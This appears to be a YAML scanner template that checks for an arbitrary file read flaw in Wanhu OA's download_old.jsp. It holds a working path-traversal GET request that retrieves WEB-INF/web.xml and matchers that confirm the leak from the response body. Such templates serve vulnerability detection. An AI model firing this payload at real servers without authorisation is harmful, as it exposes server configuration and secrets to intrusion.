id: wanhu-download-old-file-read
brief:
    title: Wanhu OA download_old.jsp - Arbitrary File Read
    by: SleepingBag945
    level: high
    about: There is an arbitrary file download vulnerability in the Wanhu OA download_old.jsp file. An attacker can download any file on the server through the vulnerability.
    label:
        - wanhu
        - lfi
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml'
      signs:
        - "on": word
          has:
            - <?xml version=
            - web-app
            - display-name
          in: body
          need: all
        - "on": status
          status:
            - 200
